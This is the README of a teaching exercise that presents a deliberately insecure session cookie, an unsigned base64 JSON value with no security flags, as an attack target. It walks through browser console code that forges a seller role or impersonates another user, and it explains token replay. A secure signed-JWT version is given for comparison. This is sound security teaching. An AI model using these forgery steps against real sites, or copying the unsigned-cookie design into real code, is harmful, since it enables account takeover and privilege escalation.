# Insecure Session — TEACHING TOY

> **WARNING: NEVER SHIP THIS CODE.**
>
> This directory contains a deliberately broken session implementation used
> as an attack target in C01.  It is here to demonstrate exactly what goes
> wrong when cookies are unsigned and have no security flags.

---

## What It Does

`session.ts` encodes a user object as base64 (`btoa(JSON.stringify(user))`)
and writes it to a cookie with zero security configuration:

- No `httpOnly` — JavaScript can read `document.cookie`
- No `secure` — sent over HTTP (plaintext)
- No `sameSite` — vulnerable to CSRF
- No signature — anyone can forge any identity
- No expiry — stolen tokens are valid forever

---

## How to Attack It

### Attack 1: Forge a different role

```js
// In the browser DevTools Console:
const raw = document.cookie
  .split('; ')
  .find(c => c.startsWith('nextmart_insecure_session='))
  ?.split('=')[1];

const payload = JSON.parse(atob(raw));
console.log(payload); // { id: "u1", email: "alice@...", name: "Alice", role: "buyer" }

// Escalate to seller:
payload.role = "seller";
const forged = btoa(JSON.stringify(payload));

// Paste forged back into DevTools → Application → Cookies → Value
// Reload the page — the server accepts the forged role.
```

### Attack 2: Impersonate another user

```js
payload.id = "u999";
payload.email = "attacker@evil.com";
payload.name = "Evil Attacker";
const forged = btoa(JSON.stringify(payload));
// Same steps — server has no way to know this is fake.
```

### Attack 3: Stolen token replay

Because there is no `exp` claim and no `Max-Age`, a token stolen from:
- A network packet dump (HTTP, not HTTPS)
- Browser history / DevTools screenshot
- An XSS `document.cookie` exfiltration

…remains valid **indefinitely**.  There is no way to invalidate it short
of restarting the server or rotating the entire session mechanism.

---

## Why The Secure Version Is Different

| Property | Insecure toy | Secure (lib/auth) |
|---|---|---|
| Token format | `btoa(JSON.stringify(user))` | Compact JWS (HS256) |
| Forgeable? | Yes — trivially | No — requires signing secret |
| Expiry | None | 24-hour `exp` claim |
| httpOnly | No | Yes |
| secure | No | Yes (production) |
| sameSite | No | lax |
| Tamper detection | None | HMAC-SHA256 signature |

A forged or tampered token against the secure version causes `jwtVerify` to
throw `JWTSignatureInvalid`, and `getSession()` returns `null`.

---

## Reference: the insecure encode/decode cycle

```
createSession("alice") → btoa('{"id":"u1","email":"alice@...","role":"buyer"}')
                       → "eyJpZCI6InUxIiwiZW1haWwiOiJhbGljZUBuZXh0bWFydC5kZXYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoiYnV5ZXIifQ=="

getSession(cookie)     → atob("eyJp...") → JSON.parse(...) → { id: "u1", ... }
```

No secret. No signature. Just encoding.
